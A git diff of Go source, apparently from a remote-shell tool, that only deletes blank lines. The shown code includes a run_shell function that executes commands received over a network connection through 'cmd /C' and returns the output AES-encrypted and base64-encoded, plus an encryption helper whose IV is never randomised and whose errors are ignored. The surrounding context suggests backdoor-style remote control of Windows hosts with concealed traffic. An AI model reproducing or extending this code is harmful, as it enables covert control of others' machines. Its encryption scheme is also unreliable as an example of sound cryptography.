@@ -46,7 +46,6 @@ func run_shell(conn net.Conn) {
         } else {
             shell_arg := []string{"/C", command}
             execcmd := exec.Command("cmd", shell_arg...)
-
             cmdout, _ := execcmd.Output()
             enc_cmdout := encryption(true, key, string(cmdout))
             output := string(enc_cmdout) + "\n"
@@ -60,25 +59,19 @@ func encryption(encrypt bool, key []byte, message string) (result string) {
     if encrypt{
         plainText := []byte(message)
         block, _ := aes.NewCipher(key)
- 
         cipherText := make([]byte, aes.BlockSize+len(plainText))
         iv := cipherText[:aes.BlockSize]
-
         stream := cipher.NewCFBEncrypter(block, iv)
         stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
-
         result = base64.URLEncoding.EncodeToString(cipherText)
 
     } else {
         cipherText, _ := base64.URLEncoding.DecodeString(message)
         block, _ := aes.NewCipher(key)
-
         iv := cipherText[:aes.BlockSize]
         cipherText = cipherText[aes.BlockSize:]
-
         stream := cipher.NewCFBDecrypter(block, iv)
         stream.XORKeyStream(cipherText, cipherText)
-
         result = string(cipherText)
     }
     return
